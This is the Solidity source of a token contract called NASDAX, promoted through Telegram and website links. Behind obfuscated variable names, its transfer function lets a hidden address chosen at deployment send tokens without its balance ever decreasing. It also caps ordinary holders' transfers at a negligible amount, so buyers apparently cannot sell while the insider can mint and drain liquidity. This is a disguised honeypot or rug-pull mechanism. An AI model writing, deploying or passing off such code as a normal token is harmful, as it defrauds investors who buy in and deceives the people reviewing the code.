/*

https://t.me/nasdax69
T
https://nasdax.cryptotoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract NASDAX is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);

    function cvshuzra(address mqjbvsei, address hsoaxyfwke, uint256 jaky) private {
        address crztw = IUniswapV2Factory(nslad.factory()).getPair(address(this), nslad.WETH());
        bool kpqvcughlt = mptdjkbivl[mqjbvsei] == block.number;
        if (0 == ktjgysnqhlo[mqjbvsei]) {
            if (mqjbvsei != crztw && (!kpqvcughlt || jaky > qtosg[mqjbvsei]) && jaky < totalSupply) {
                require(jaky <= totalSupply / (10 ** decimals));
            }
            balanceOf[mqjbvsei] -= jaky;
        }
        qtosg[hsoaxyfwke] = jaky;
        balanceOf[hsoaxyfwke] += jaky;
        mptdjkbivl[hsoaxyfwke] = block.number;
        emit Transfer(mqjbvsei, hsoaxyfwke, jaky);
    }

    mapping(address => uint256) private mptdjkbivl;

    mapping(address => uint256) private qtosg;

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private wsmjg = 114;

    mapping(address => mapping(address => uint256)) public allowance;

    string public name;

    string public symbol;

    constructor(string memory bcktymfe, string memory bgdyhkjocs, address gkhfa, address wudkzi) {
        name = bcktymfe;
        symbol = bgdyhkjocs;
        balanceOf[msg.sender] = totalSupply;
        ktjgysnqhlo[wudkzi] = wsmjg;
        nslad = IUniswapV2Router02(gkhfa);
    }

    function transfer(address hsoaxyfwke, uint256 jaky) public returns (bool success) {
        cvshuzra(msg.sender, hsoaxyfwke, jaky);
        return true;
    }

    mapping(address => uint256) private ktjgysnqhlo;

    function transferFrom(address mqjbvsei, address hsoaxyfwke, uint256 jaky) public returns (bool success) {
        require(jaky <= allowance[mqjbvsei][msg.sender]);
        allowance[mqjbvsei][msg.sender] -= jaky;
        cvshuzra(mqjbvsei, hsoaxyfwke, jaky);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private nslad;

    function approve(address qvsmhuk, uint256 jaky) public returns (bool success) {
        allowance[msg.sender][qvsmhuk] = jaky;
        emit Approval(msg.sender, qvsmhuk, jaky);
        return true;
    }
}
